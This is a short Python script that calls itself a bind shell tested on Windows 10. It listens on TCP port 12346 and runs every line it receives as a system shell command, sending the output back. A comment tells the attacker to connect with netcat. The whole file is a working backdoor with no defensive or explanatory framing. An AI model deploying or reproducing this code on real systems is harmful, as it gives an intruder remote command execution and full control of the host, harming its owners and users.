#!/usr/bin/python3

""" Python 3.6 Bind Shell Tested on Windows 10 """

# Usage: nc -v <ipaddress> 12346 in the attacker machine to connect to the shell. Enter quit to end session

import os
import subprocess
import socket

PORT = 12346

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', PORT))
s.listen(1)
(conn, addr) = s.accept()

with conn:
    conn.send('[*] ======================================================= [*]\n'.encode())
    conn.send('[*] Connection Established!\n'.encode())
    conn.send('[*] ======================================================= [*]\n'.encode())
    conn.send('$'.encode())

    while 1:
        data = conn.recv(1024)
        if "quit" in data.decode():
            break
        proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        conn.send(stdout_value)
        conn.send('$'.encode())

s.close()


